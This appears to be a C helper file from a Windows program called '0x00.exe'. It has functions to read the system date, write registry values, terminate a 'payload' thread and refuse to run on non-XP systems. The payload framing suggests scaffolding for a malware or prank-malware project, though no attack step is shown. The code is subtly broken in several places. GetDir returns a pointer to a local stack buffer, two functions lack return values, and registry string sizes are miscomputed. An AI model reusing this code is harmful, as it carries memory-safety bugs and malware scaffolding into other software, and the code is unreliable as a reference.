#pragma once
#include "0x00.h"

#define DATE_YEAR 0
#define DATE_MONTH 1
#define DATE_DAY 2

INT 
DateCheck( INT date ) 
{
		SYSTEMTIME lpSystemTime;
		GetSystemTime(&lpSystemTime);
		switch (date) {
			case DATE_YEAR: {
				return lpSystemTime.wYear;
				break;
			}
			case DATE_MONTH: {
				return lpSystemTime.wMonth;
				break;
			}
			case DATE_DAY: {
				return lpSystemTime.wDay;
				break;
			}
		}
}

LPCSTR GetDir(VOID) {
  CHAR cBuffer[MAX_PATH];
  GetModuleFileNameA(NULL, (CHAR*)cBuffer, MAX_PATH);
  return (LPCSTR)cBuffer;
}

FLONG WINAPI ManageRegW(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, BYTE lpData, LPBYTE lpData2, bool isSet, bool isString) {
    HKEY hkResult;
    if (isSet == false) {
        if (isString == false) {
            RegCreateKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
        }
        else if (isString == true) {
            RegCreateKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
        }
    }
    else if (isSet == true) {
        if (isString == false) {
            RegOpenKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
        }
        else if (isString == true) {
            RegOpenKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
        }
    }
}

VOID EndPayload(HANDLE hPayload, HANDLE hPML)
{
	TerminateThread(hPayload, NULL);
	CloseHandle(hPayload);
	HeapDestroy(hPML);
}
	
INT 
ifWindowsXP( VOID ) 
{
		OSVERSIONINFOW versionInformation;
		memset(&versionInformation, 0, sizeof(OSVERSIONINFOW));
		versionInformation.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
		GetVersionExW(&versionInformation);
		if (versionInformation.dwMajorVersion == 5) return TRUE;
		return FALSE;
}

INT NotXP()
{
    MessageBoxW(NULL, L"This does not support your version of Windows", L"0x00.exe - Error", MB_OK | MB_ICONERROR);
	  exit(0);
}
